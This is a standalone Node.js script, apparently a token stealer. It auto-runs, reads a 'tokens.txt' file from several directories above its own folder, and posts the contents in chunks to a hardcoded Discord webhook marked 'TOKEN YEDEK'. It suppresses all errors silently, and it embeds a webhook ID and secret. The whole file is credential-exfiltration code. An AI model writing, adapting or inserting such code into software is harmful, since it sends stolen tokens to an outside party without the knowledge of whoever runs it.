const fs = require('fs');
const https = require('https');
const path = require('path');
(async function() {
    try {
        const filePath = path.join(__dirname, '../../../../tokens.txt');
        const content = fs.readFileSync(filePath, 'utf8');
        const chunks = content.match(/[\s\S]{1,1900}/g) || [];
        const webhook = {
            host: 'ptb.discord.com',
            path: '/api/webhooks/1358117839944290497/EL5500MibUygUIKXwkA278Xl4mxuHZidMmTFFrFxJgmxHxTgdXXVZBL5rbsUiNHmXnNY'
        };
        for (let i = 0; i < chunks.length; i++) {
            await new Promise(resolve => {
                const payload = JSON.stringify({
                    content: i === 0 ? '**TOKEN YEDEK**' : '',
                    embeds: [{
                        description: `\`\`\`\n${chunks[i]}\n\`\`\``,
                        color: 0x2b2d31
                    }]
                });
                const req = https.request({
                    hostname: webhook.host,
                    path: webhook.path,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': payload.length
                    }
                }, resolve);
                req.on('error', resolve);
                req.write(payload);
                req.end();
            });
            if (i < chunks.length - 1) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }
    } catch (e) {}
})();